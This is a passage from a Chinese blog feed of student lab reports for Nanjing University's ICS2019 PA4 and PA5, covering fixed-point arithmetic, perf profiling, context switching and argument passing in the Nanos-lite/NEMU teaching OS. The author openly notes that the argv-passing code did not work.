class="hljs-comment">// 执行乘法运算</span>  <span class="hljs-type">int</span> product_hi = (a &gt;&gt; <span class="hljs-number">16</span>) * (b &gt;&gt; <span class="hljs-number">16</span>);  <span class="hljs-comment">// 高16位的乘积</span>  <span class="hljs-type">int</span> product_lo = (a &amp; <span class="hljs-number">0xFFFF</span>) * (b &amp; <span class="hljs-number">0xFFFF</span>);  <span class="hljs-comment">// 低16位的乘积</span>  <span class="hljs-comment">// 处理溢出</span>  <span class="hljs-type">int</span> carry = product_lo &gt;&gt; <span class="hljs-number">16</span>;  <span class="hljs-comment">// 检查低16位乘积是否产生进位</span>  product_hi += carry;  <span class="hljs-comment">// 加上进位</span>  <span class="hljs-comment">// 舍入处理</span>  <span class="hljs-type">int</span> rounding = <span class="hljs-number">0x8000</span>;  <span class="hljs-comment">// 用于舍入的值</span>  <span class="hljs-type">int</span> result = (product_hi &lt;&lt; <span class="hljs-number">16</span>) + ((product_lo + rounding) &gt;&gt; <span class="hljs-number">16</span>);  <span class="hljs-comment">// 恢复符号位</span>  result = (result ^ sign) - sign;  <span class="hljs-keyword">return</span> result;}</code></pre></div></div><h4 id="除法">除法</h4><p>和乘法类似，也是采用列竖式的思路。</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-xxhxtilmrh9u68"></i><span>C++</span><div class="collapse show" id="collapse-xxhxtilmrh9u68"><pre><code class="hljs C++"><span class="hljs-function">FLOAT <span class="hljs-title">F_div_F</span><span class="hljs-params">(FLOAT a, FLOAT b)</span> </span>{  FLOAT result = <span class="hljs-built_in">Fabs</span>(a) / <span class="hljs-built_in">Fabs</span>(b);  FLOAT m = <span class="hljs-built_in">Fabs</span>(a);  FLOAT n = <span class="hljs-built_in">Fabs</span>(b);  m = m % n;    <span class="hljs-comment">//竖式除法</span>  <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">16</span>; i++) {    m &lt;&lt;= <span class="hljs-number">1</span>;    result &lt;&lt;= <span class="hljs-number">1</span>;    <span class="hljs-keyword">if</span> (m &gt;= n) {      m -= n;      result++;    }  }  <span class="hljs-comment">//恢复符号位</span>  <span class="hljs-keyword">if</span> (((a ^ b) &amp; <span class="hljs-number">0x80000000</span>) == <span class="hljs-number">0x80000000</span>) {    result = -result;  }  <span class="hljs-keyword">return</span> result;}</code></pre></div></div><h3 id="float和int转换">FLOAT和int转换</h3><p>直接取整数部分即可。</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-o544nklmrh9u68"></i><span>C++</span><div class="collapse show" id="collapse-o544nklmrh9u68"><pre><code class="hljs C++"><span class="hljs-function"><span class="hljs-type">static</span> <span class="hljs-keyword">inline</span> <span class="hljs-type">int</span> <span class="hljs-title">F2int</span><span class="hljs-params">(FLOAT a)</span></span><span class="hljs-function"></span>{  <span class="hljs-keyword">if</span> ((a &amp; <span class="hljs-number">0x80000000</span>) == <span class="hljs-number">0</span>)  {    <span class="hljs-keyword">return</span> a &gt;&gt; <span class="hljs-number">16</span>;  }  <span class="hljs-keyword">else</span>  {    <span class="hljs-keyword">return</span> -((-a) &gt;&gt; <span class="hljs-number">16</span>);  }}<span class="hljs-function"><span class="hljs-type">static</span> <span class="hljs-keyword">inline</span> FLOAT <span class="hljs-title">int2F</span><span class="hljs-params">(<span class="hljs-type">int</span> a)</span></span><span class="hljs-function"></span>{  <span class="hljs-keyword">if</span> ((a &amp; <span class="hljs-number">0x80000000</span>) == <span class="hljs-number">0</span>)  {    <span class="hljs-keyword">return</span> a &lt;&lt; <span class="hljs-number">16</span>;  }  <span class="hljs-keyword">else</span>  {    <span class="hljs-keyword">return</span> -((-a) &lt;&lt; <span class="hljs-number">16</span>);  }}</code></pre></div></div><h3 id="float和int乘除">FLOAT和int乘除</h3><p>直观的思路是都把他们转成FLOAT类型。</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-0zwlyhlmrh9u68"></i><span>C++</span><div class="collapse show" id="collapse-0zwlyhlmrh9u68"><pre><code class="hljs C++"><span class="hljs-function"><span class="hljs-type">static</span> <span class="hljs-keyword">inline</span> FLOAT <span class="hljs-title">F_mul_int</span><span class="hljs-params">(FLOAT a, <span class="hljs-type">int</span> b)</span></span><span class="hljs-function"></span>{    <span class="hljs-comment">// assert(0);</span>  <span class="hljs-keyword">return</span> <span class="hljs-built_in">F_mul_F</span>(a, <span class="hljs-built_in">int2F</span>(b));}<span class="hljs-function"><span class="hljs-type">static</span> <span class="hljs-keyword">inline</span> FLOAT <span class="hljs-title">F_div_int</span><span class="hljs-params">(FLOAT a, <span class="hljs-type">int</span> b)</span></span><span class="hljs-function"></span>{    <span class="hljs-comment">// assert(0);</span>  <span class="hljs-keyword">return</span> <span class="hljs-built_in">F_div_F</span>(a, <span class="hljs-built_in">int2F</span>(b));}</code></pre></div></div><p>成功运行战斗场景。</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6ics2019_PA5/20230828210316468177_507_20230601235927896331_956_image-20230601111624447.png" alt="image-20230601111624447"><figcaption aria-hidden="true">image-20230601111624447</figcaption></figure><h2 id="通往高速的次元">通往高速的次元</h2><p>如果用VMware的话需要开这两个选项:</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6ics2019_PA5/20230828210320091905_497_20230601235930759689_235_image-20230601112713746.png" alt="image-20230601112713746"><figcaption aria-hidden="true">image-20230601112713746</figcaption></figure><p>报这种错误:</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-rca7fwlmrh9u68"></i><span>shell</span><div class="collapse show" id="collapse-rca7fwlmrh9u68"><pre><code class="hljs shell">Error:You may not have permission to collect stats.Consider tweaking /proc/sys/kernel/perf_event_paranoid: -1 - Not paranoid at all  0 - Disallow raw tracepoint access for unpriv  1 - Disallow cpu events for unpriv  2 - Disallow kernel profiling for unpriv</code></pre></div></div><p>可以临时提权:</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-vg1u67lmrh9u68"></i><span>shell</span><div class="collapse show" id="collapse-vg1u67lmrh9u68"><pre><code class="hljs shell">sudo sh -c "echo -1 &gt; /proc/sys/kernel/perf_event_paranoid"</code></pre></div></div><p>运行: </p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-krb79zlmrh9u68"></i><span>shell</span><div class="collapse show" id="collapse-krb79zlmrh9u68"><pre><code class="hljs shell">perf record nemu/build/x86-nemu nanos-lite/build/nanos-lite-x86-nemu.bin</code></pre></div></div><p></p><p>我感觉也不太好看出什么。。</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6ics2019_PA5/20230828210321017793_737_20230601235934898992_647_image-20230601113933501.png" alt="image-20230601113933501"><figcaption aria-hidden="true">image-20230601113933501</figcaption></figure><p>好吧，下一章第一句话就是</p><blockquote><p>相信你也已经在NEMU中运行过<code>microbench</code>,发现NEMU的性能连真机的1%都不到.使用<code>perf</code>也没有发现能突破性能瓶颈的地方.</p></blockquote><h3 id="性能瓶颈的来源">性能瓶颈的来源</h3><p>略</p>]]></content>
    
    
    <categories>
      
      <category>作业</category>
      
    </categories>
    
    
    <tags>
      
      <tag>系统设计</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>南京大学ics2019_PA4</title>
    <link href="/posts/44109/"/>
    <url>/posts/44109/</url>
    
    <content type="html"><![CDATA[<h1 id="pa4实验报告">PA4实验报告</h1><p>2013599 田佳业</p><h2 id="阶段一">阶段一</h2><h3 id="实现上下文切换">实现上下文切换</h3><ul><li>CTE的<code>_kcontext()</code>函数</li></ul><p>已经做了3个PA了，对“你需要“这样的字眼已经很敏感了.根据讲义:</p><blockquote><p>在<code>kstack</code>的底部创建一个以<code>entry</code>为返回地址的上下文结构(目前你可以先忽略<code>arg</code>参数),然后返回这一结构的指针.Nanos-lite会调用<code>_kcontext()</code>来创建上下文,并把返回的指针记录到PCB的<code>cp</code>中.</p></blockquote><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-v7bbw7lmrh9u68"></i><span>C++</span><div class="collapse show" id="collapse-v7bbw7lmrh9u68"><pre><code class="hljs C++">_Context *_kcontext(_Area stack, <span class="hljs-built_in">void</span> (*entry)(<span class="hljs-type">void</span> *), <span class="hljs-type">void</span> *arg) {_Context *new_p=(_Context*)(stack.end-<span class="hljs-built_in">sizeof</span>(_Context));new_p-&gt;eip=(<span class="hljs-type">uintptr_t</span>)entry;new_p-&gt;eflags=<span class="hljs-number">0x2</span>;new_p-&gt;cs=<span class="hljs-number">8</span>;<span class="hljs-keyword">return</span> new_p;}</code></pre></div></div><ul><li>Nanos-lite的<code>schedule()</code>函数</li></ul><p>如指导书所述</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-0vpnm0lmrh9u68"></i><span>C++</span><div class="collapse show" id="collapse-0vpnm0lmrh9u68"><pre><code class="hljs C++"><span class="hljs-function">_Context *<span class="hljs-title">schedule</span><span class="hljs-params">(_Context *prev)</span></span><span class="hljs-function"></span>{  <span class="hljs-comment">// save the context pointer</span>  current-&gt;cp = prev;  <span class="hljs-comment">// always select pcb[0] as the new process</span>  current = &amp;pcb[<span class="hljs-number">0</span>];  <span class="hljs-comment">// then return the new context</span>  <span class="hljs-keyword">return</span> current-&gt;cp;}</code></pre></div></div><ul><li>在Nanos-lite收到<code>_EVENT_YIELD</code>事件后,调用<code>schedule()</code>并返回新的上下文</li></ul><p><code>nanos-lite/src/irq.c</code></p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-54vefklmrh9u68"></i><span>C++</span><div class="collapse show" id="collapse-54vefklmrh9u68"><pre><code class="hljs C++"><span class="hljs-keyword">case</span> _EVENT_YIELD:  <span class="hljs-built_in">Log</span>(<span class="hljs-string">"_EVENT_YIELD recognized"</span>);  <span class="hljs-keyword">return</span> <span class="hljs-built_in">schedule</span>(c);</code></pre></div></div><ul><li>修改CTE中<code>__am_asm_trap()</code>的实现,使得从<code>__am_irq_handle()</code>返回后,先将栈顶指针切换到新进程的上下文结构, 然后才恢复上下文,从而完成上下文切换的本质操作</li></ul><p>这一部分是最核心的。</p><p><code>nexus-am/am/src/x86/nemu/trap.S</code></p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-73hn2ilmrh9u68"></i><span>C++</span><div class="collapse show" id="collapse-73hn2ilmrh9u68"><pre><code class="hljs C++">__am_asm_trap:  pushal  pushl $<span class="hljs-number">0</span>  pushl %esp  call __am_irq_handle  addl $<span class="hljs-number">4</span>, %esp  movl %eax,%esp  addl $<span class="hljs-number">4</span>, %esp  popal  addl $<span class="hljs-number">4</span>, %esp  iret</code></pre></div></div><p>加的是<code>movl %eax,%esp</code>。为什么呢？<code>__am_irq_handle</code>在<code>cte.c</code>中返回的正是<code>_Context</code>结构体的指针，保存在<code>eax</code>寄存器中。原来的时候我们直接跳过这个返回值，恢复中断调用前的上下文。现在我们将栈顶指针指到这个上下文地址，我们后面就可以继续<code>pop</code>新的上下文信息，从而实现乾坤挪移。</p><p>另外这样之后<code>movl %eax,%esp</code>前面那句其实也并不起什么作用了。原来的目的是跳过压栈的<code>esp</code>，现在<code>move</code>指令既然都能直接跳转到另外一个进程的<code>_Context</code>结构体的位置了(虽然也有可能还是自身)，减不减已经无所谓了。</p><p>最后进行测试:</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-apn0bmlmrh9u68"></i><span>C++</span><div class="collapse show" id="collapse-apn0bmlmrh9u68"><pre><code class="hljs C++"><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">init_proc</span><span class="hljs-params">()</span></span><span class="hljs-function"></span>{  <span class="hljs-built_in">context_kload</span>(&amp;pcb[<span class="hljs-number">0</span>], hello_fun);  switch_boot_pcb();  <span class="hljs-built_in">Log</span>(<span class="hljs-string">"Initializing processes..."</span>);  <span class="hljs-comment">// char filename[] = "/bin/init";</span>  <span class="hljs-comment">// // load program here</span>  <span class="hljs-comment">// naive_uload(NULL, filename);</span>}</code></pre></div></div><p>注意按照指导书，我们就不需要使用原来的<code>naive_uload()</code>了。<code>context_kload</code>会调用CTE的<code>kcontext()</code>来创建一个上下文。调用<code>switch_boot_pcb()</code>则是为了初始化<code>current</code>指针.</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6ics2019_PA4/20230828205703143955_661_20230601235455853128_651_image-20230524103308566.png" alt="image-20230524103308566"><figcaption aria-hidden="true">image-20230524103308566</figcaption></figure><h3 id="实现上下文切换2">实现上下文切换(2)</h3><ul><li>修改CTE的<code>_kcontext()</code>函数,使其支持参数<code>arg</code>的传递</li></ul><p>这个地方就涉及到x86的函数调用约定了。讲义中提到“mips32和riscv32的调用约定”需要查阅相应的ABI手册，默认我们知道x86的调用约定(捂脸)。借此问题也回顾模拟了PA3中中断调用的过程。感谢某舍友的帮助，非常有耐心的让我把模糊的细节弄清楚了。详细见必答题部分。</p><p>现在增加了参数，就不再是这样了。因此原来的</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-pwn2hilmrh9u68"></i><span>C++</span><div class="collapse show" id="collapse-pwn2hilmrh9u68"><pre><code class="hljs C++">_Context *new_p=(_Context*)(stack.end-<span class="hljs-built_in">sizeof</span>(_Context));</code></pre></div></div><p>现在还要多减一些，因为end不再紧跟context了，而是依次多了返回值和函数参数。</p><p>当然我们还要把参数放到正确的位置。显然这个位置是<code>(stack.end-4，stack.end]</code>，按照函数调用约定。距离上下文结构体(切换的栈帧底部）需要留出返回地址所在的4字节位置。</p><p>原来这个函数是没有<code>arg</code>参数的，现在我们需要手动加上。参数所指向的地址(4字节)。</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-t4xgp2lmrh9u68"></i><span>C++</span><div class="collapse show" id="collapse-t4xgp2lmrh9u68"><pre><code class="hljs C++">_Context *_kcontext(_Area stack, <span class="hljs-built_in">void</span> (*entry)(<span class="hljs-type">void</span> *), <span class="hljs-type">void</span> *arg) {_Context *new_p=(_Context*)(stack.end-<span class="hljs-built_in">sizeof</span>(_Context)<span class="hljs-number">-8</span>);  <span class="hljs-type">void</span> ** temp=(<span class="hljs-type">void</span>**)(stack.end<span class="hljs-number">-4</span>);  *temp=arg;new_p-&gt;eip=(<span class="hljs-type">uintptr_t</span>)entry;new_p-&gt;eflags=<span class="hljs-number">0x2</span>;new_p-&gt;cs=<span class="hljs-number">8</span>;<span class="hljs-keyword">return</span> new_p;}</code></pre></div></div><p>根据上面的解释为什么减8也比较清楚了，还是需要注意<code>arg</code>是个指针，不管它的内容具体是多少都是占4字节。</p><ul><li>修改<code>hello_fun()</code>函数, 使其输出参数.你可以自行约定参数<code>arg</code>的类型, 包括整数, 字符, 字符串,指针等皆可, 然后按照你的约定来解析<code>arg</code>.</li></ul><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-qeam8elmrh9u68"></i><span>C++</span><div class="collapse show" id="collapse-qeam8elmrh9u68"><pre><code class="hljs C++"><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">hello_fun</span><span class="hljs-params">(<span class="hljs-type">void</span> *arg)</span></span><span class="hljs-function"></span>{  <span class="hljs-type">int</span> j = <span class="hljs-number">1</span>;  <span class="hljs-keyword">while</span> (<span class="hljs-number">1</span>)  {    <span class="hljs-comment">// Log("Hello World from Nanos-lite for the %dth time!", j);</span>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">"%x"</span>,arg);    j++;    _yield();  }}</code></pre></div></div><ul><li>通过<code>_kcontext()</code>创建第二个以<code>hello_fun()</code>为入口的内核线程,并传递不同的参数</li></ul><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-f5b245lmrh9u68"></i><span>C++</span><div class="collapse show" id="collapse-f5b245lmrh9u68"><pre><code class="hljs C++"><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">init_proc</span><span class="hljs-params">()</span></span><span class="hljs-function"></span>{  <span class="hljs-built_in">context_kload</span>(&amp;pcb[<span class="hljs-number">0</span>], hello_fun,<span class="hljs-number">1</span>);  <span class="hljs-built_in">context_kload</span>(&amp;pcb[<span class="hljs-number">1</span>], hello_fun,<span class="hljs-number">2</span>);  switch_boot_pcb();  <span class="hljs-built_in">Log</span>(<span class="hljs-string">"Initializing processes..."</span>);}</code></pre></div></div><ul><li>修改Nanos-lite的<code>schedule()</code>函数,使其轮流返回两个上下文</li></ul><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-wvej25lmrh9u68"></i><span>C++</span><div class="collapse show" id="collapse-wvej25lmrh9u68"><pre><code class="hljs C++"><span class="hljs-function">_Context *<span class="hljs-title">schedule</span><span class="hljs-params">(_Context *prev)</span></span><span class="hljs-function"></span>{  <span class="hljs-comment">// save the context pointer</span>  current-&gt;cp = prev;  current = ((current == &amp;pcb[<span class="hljs-number">0</span>]) ? &amp;pcb[<span class="hljs-number">1</span>] : &amp;pcb[<span class="hljs-number">0</span>]);  <span class="hljs-comment">// then return the new context</span>  <span class="hljs-keyword">return</span> current-&gt;cp;}</code></pre></div></div><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6ics2019_PA4/20230828205704516608_486_20230601235457992775_260_image-20230529100302757.png" alt="image-20230529100302757"><figcaption aria-hidden="true">image-20230529100302757</figcaption></figure><h3 id="实现多道程序系统">实现多道程序系统</h3><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-hvc9zklmrh9u68"></i><span>C++</span><div class="collapse show" id="collapse-hvc9zklmrh9u68"><pre><code class="hljs C++">_Context *_ucontext(_AddressSpace *as, _Area ustack, _Area kstack, <span class="hljs-type">void</span> *entry, <span class="hljs-type">void</span> *args) {_Context *new_p=(_Context*)(ustack.end<span class="hljs-number">-16</span>-<span class="hljs-built_in">sizeof</span>(_Context));new_p-&gt;eip=(<span class="hljs-type">uintptr_t</span>)entry;new_p-&gt;cs=<span class="hljs-number">8</span>;new_p-&gt;eflags=<span class="hljs-number">0x00000202</span>;new_p-&gt;as=as;<span class="hljs-keyword">return</span> new_p;}</code></pre></div></div><p>为什么减16呢？同样的道理，讲义中提到:</p><blockquote><p>操作系统在加载用户进程的时候,还需要负责把<code>argc/argv/envp</code>以及相应的字符串放在用户栈中,并把它们的存放方式和位置作为和用户进程的约定之一,这样用户进程在<code>_start</code>中就可以访问它们了.</p></blockquote><p><code>argc/argv/envp</code>加上返回地址，就是4个4字节的指针，按照调用约定放到栈底。不过这个是在讲义后面提到的，也是阅读了这一部分才明白原理。</p><p>形象点说就是这样:<img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6ics2019_PA4/20230828205705617321_438_20230601235500203470_105_image-20230529104434579.png" alt="image-20230529104434579" width="67%" height="67%"></p><p>图来自于袁老师《计算机系统基础》课本第七章</p><p>还ics2021讲义里面是有这个图的，2019就没有，可能也是因为很多外校学生做实验的时候不知道这事(捂脸)</p><p>至于讲义中</p><blockquote><p>需要在<code>serial_write()</code>, <code>events_read()</code>和<code>fb_write()</code>的开头调用<code>_yield()</code>,来模拟设备访问缓慢的情况. 添加之后, 访问设备时就要进行上下文切换,从而实现多道程序系统的功能.</p></blockquote><p>并不是完成这个任务所必须的，只是为了更符合“实际情况”。</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-lo2po2lmrh9u68"></i><span>C++</span><div class="collapse show" id="collapse-lo2po2lmrh9u68"><pre><code class="hljs C++"><span class="hljs-built_in">context_kload</span>(&amp;pcb[<span class="hljs-number">1</span>], hello_fun,<span class="hljs-number">2</span>);<span class="hljs-built_in">context_uload</span>(&amp;pcb[<span class="hljs-number">0</span>], <span class="hljs-string">"/bin/pal"</span>);</code></pre></div></div><p>注意至少得有一个内核进程。一开始我写成了这样:</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-lrpev5lmrh9u68"></i><span>C++</span><div class="collapse show" id="collapse-lrpev5lmrh9u68"><pre><code class="hljs C++"><span class="hljs-built_in">context_uload</span>(&amp;pcb[<span class="hljs-number">0</span>], <span class="hljs-string">"/bin/hello"</span>);<span class="hljs-built_in">context_uload</span>(&amp;pcb[<span class="hljs-number">1</span>], <span class="hljs-string">"/bin/pal"</span>);</code></pre></div></div><p>内核便会不断的重启。</p><p>读到后面发现这就是讲义中的<code>一山不能藏二虎?</code>问题。</p><p>解答:编译Navy-apps中的程序时, 我们都把它们链接到0x83000000的内存位置,如果我们正在运行仙剑奇侠传, 同时也想运行hello程序,它们的内容就会被相互覆盖。</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6ics2019_PA4/20230828205706936987_880_20230601235504869760_814_image-20230529100930844.png" alt="image-20230529100930844"><figcaption aria-hidden="true">image-20230529100930844</figcaption></figure><h3 id="给用户进程传递参数">给用户进程传递参数</h3><p>这一部分耗费的时间大概几乎是其他所有部分的总和(捂脸)，但是做完所有实验还是没有解决这个问题。</p><p>这一部分讲义就讲的和实际不一致。</p><blockquote><p>根据这一约定, 你还需要修改Navy-apps中<code>_start</code>的代码,在其调用<code>call_main()</code>之前把它的参数设置成<code>argc</code>的地址.然后修改<code>navy-apps/libs/libc/src/plaform/crt0.c</code>中<code>call_main()</code>的代码,让它解析出真正的<code>argc/argv/envp</code>, 并调用<code>main()</code>.这样以后, 用户进程就可以接收到属于它的参数了.</p></blockquote><p>Navy-apps中根本就没有<code>_start</code>函数，也没有什么<code>call_main</code>。但是<code>call_main</code>应当是指的<code>crt_0</code>中这个部分:</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-nwowtxlmrh9u68"></i><span>C++</span><div class="collapse show" id="collapse-nwowtxlmrh9u68"><pre><code class="hljs C++"><span class="hljs-type">void</span> _start(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span> *argv[], <span class="hljs-type">char</span> *envp[]) {  <span class="hljs-type">char</span> *env[] = {<span class="hljs-literal">NULL</span>};  environ = env;  <span class="hljs-built_in">printf</span>(<span class="hljs-string">"argc:%d\n"</span>,argc);  <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;argc;i++){    <span class="hljs-type">char</span> *str=(<span class="hljs-type">char</span>**)(argv[i]);    <span class="hljs-built_in">printf</span>(<span class="hljs-string">"argv[%d]:%s\n"</span>,i,str);  }  <span class="hljs-built_in">exit</span>(<span class="hljs-built_in">main</span>(argc, argv, env));  <span class="hljs-built_in">assert</span>(<span class="hljs-number">0</span>);}</code></pre></div></div><p>正常的想法应该是这样，按照函数调用约定把字符数组首地址放到正确的位置:</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-292oj8lmrh9u68"></i><span>C++</span><div class="collapse show" id="collapse-292oj8lmrh9u68"><pre><code class="hljs C++">  _Context *new_p = (_Context *)(ustack.end - <span class="hljs-number">16</span> - <span class="hljs-built_in">sizeof</span>(_Context));  <span class="hljs-type">uintptr_t</span> pos = ustack.end - <span class="hljs-number">8</span>;  <span class="hljs-type">void</span> **argv_temp = (<span class="hljs-type">void</span> **)(pos);  *argv_temp = (<span class="hljs-type">void</span> *)(argv);  <span class="hljs-type">void</span> **argc_temp = (<span class="hljs-type">void</span> **)(ustack.end - <span class="hljs-number">12</span>);  *argc_temp = (<span class="hljs-type">void</span> *)(argc);  <span class="hljs-comment">// correct</span>  <span class="hljs-comment">// char* first_str=argv[0];</span>  <span class="hljs-comment">// printf("%s\n",first_str);</span>  <span class="hljs-type">char</span> *first_str = ((<span class="hljs-type">char</span> **)(*argv_temp))[<span class="hljs-number">0</span>];  <span class="hljs-built_in">printf</span>(<span class="hljs-string">"%s\n"</span>, first_str);  new_p-&gt;eip = (<span class="hljs-type">uintptr_t</span>)entry;  new_p-&gt;cs = <span class="hljs-number">8</span>;  new_p-&gt;eflags = <span class="hljs-number">0x00000202</span>;  new_p-&gt;esp = (<span class="hljs-type">uintptr_t</span>)(&amp;new_p-&gt;irq);  new_p-&gt;as = as;  <span class="hljs-keyword">return</span> new_p;}</code></pre></div></div><p>但是这样<code>argc</code>没问题，<code>argv</code>却无法正常读取。和其他做2019的同学交流得知他们这样做是没有问题的。</p><p>甚至后面尝试了直接在栈上吧字符串数组放进去，当然虽然指导书是这么说的，但常量字符串应当在堆区，显然也是有些荒谬的。</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-trqm9vlmrh9u68"></i><span>C++</span><div class="collapse show" id="collapse-trqm9vlmrh9u68"><pre><code class="hljs C++"><span class="hljs-type">int</span> space_count=<span class="hljs-number">0</span>;<span class="hljs-keyword">if</span>(argv){  <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;argc;i++){    space_count+=(<span class="hljs-built_in">strlen</span>(argv[i])+<span class="hljs-number">1</span>);  }}space_count+=argc;space_count+=<span class="hljs-number">4</span>; <span class="hljs-comment">//return address,argc,argv,envp</span>space_count*=<span class="hljs-number">4</span>; <span class="hljs-comment">//4 bytes for each</span><span class="hljs-built_in">printf</span>(<span class="hljs-string">"space_count:%d\n"</span>,space_count);<span class="hljs-built_in">printf</span>(<span class="hljs-string">"end of stack addr:%x\n"</span>,ustack.end);_Context *new_p=(_Context*)(ustack.end-space_count-<span class="hljs-built_in">sizeof</span>(_Context));<span class="hljs-type">void</span>** argc_stack=(<span class="hljs-type">void</span>**)(ustack.end-space_count+<span class="hljs-number">4</span>);*argc_stack=(<span class="hljs-type">void</span>*)(argc);<span class="hljs-comment">// printf("argc:%d\n",(int)(*argc_stack));</span><span class="hljs-comment">//ignore the envp</span><span class="hljs-comment">// the pos to store strings</span><span class="hljs-type">uintptr_t</span> pos=ustack.end-space_count+<span class="hljs-number">16</span>+argc*<span class="hljs-built_in">sizeof</span>(<span class="hljs-type">char</span>*);<span class="hljs-built_in">printf</span>(<span class="hljs-string">"string storeing start addr:%x\n"</span>,pos);<span class="hljs-type">char</span>* argv_strs[argc];<span class="hljs-type">uintptr_t</span> argv_stack_addr=ustack.end-space_count+<span class="hljs-number">8</span>;<span class="hljs-type">void</span>** argv_stack=(<span class="hljs-type">void</span>**)(argv_stack_addr);*argv_stack=(<span class="hljs-type">void</span>*)(ustack.end-space_count+<span class="hljs-number">16</span>);<span class="hljs-built_in">printf</span>(<span class="hljs-string">"argv_stack addr:%x\n"</span>,(<span class="hljs-type">uintptr_t</span>)(argv_stack));<span class="hljs-built_in">printf</span>(<span class="hljs-string">"argv_stack value:%x\n"</span>,(<span class="hljs-type">uintptr_t</span>)(*argv_stack));<span class="hljs-function"><span class="hljs-keyword">extern</span> <span class="hljs-title">memcpy</span><span class="hljs-params">(<span class="hljs-type">void</span>* dst,<span class="hljs-type">void</span>* src,<span class="hljs-type">size_t</span> n)</span></span>;<span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;argc;i++){  <span class="hljs-type">void</span>** str_stack=(<span class="hljs-type">void</span>**)(pos);  <span class="hljs-comment">//copy the string</span>  <span class="hljs-comment">// memcpy(*str_stack,argv[i],strlen(argv[i])+1);</span>  <span class="hljs-built_in">strcpy</span>(*str_stack,argv[i]);  <span class="hljs-built_in">printf</span>(<span class="hljs-string">"str %s stored at addr:%x\n"</span>,(<span class="hljs-type">char</span>*)(*str_stack),(<span class="hljs-type">uintptr_t</span>)(str_stack));  <span class="hljs-built_in">printf</span>(<span class="hljs-string">"the val of the str addr is %x\n"</span>,(<span class="hljs-type">uintptr_t</span>)(*str_stack));  argv_strs[i]=(<span class="hljs-type">char</span>*)(*str_stack);  pos+=<span class="hljs-built_in">strlen</span>(argv[i])+<span class="hljs-number">1</span>;}<span class="hljs-comment">//copy the argv</span><span class="hljs-comment">// memcpy(*argv_stack,argv_strs,argc*sizeof(char*));</span><span class="hljs-built_in">strcpy</span>(*argv_stack,argv_strs);<span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;argc;i++){  <span class="hljs-type">void</span> ** temp=(<span class="hljs-type">void</span>**)(*argv_stack);  <span class="hljs-built_in">printf</span>(<span class="hljs-string">"argv %x stored at addr:%x\n"</span>,(<span class="hljs-type">uintptr_t</span>)(temp[i]),(<span class="hljs-type">uintptr_t</span>)(temp+i));  <span class="hljs-built_in">printf</span>(<span class="hljs-string">"it points to %s\n"</span>,(<span class="hljs-type">char</span>*)(temp[i]));}</code></pre></div></div><p>而且这种方法在开启分页之后也没跑成功。</p><p>后来发现有个<a 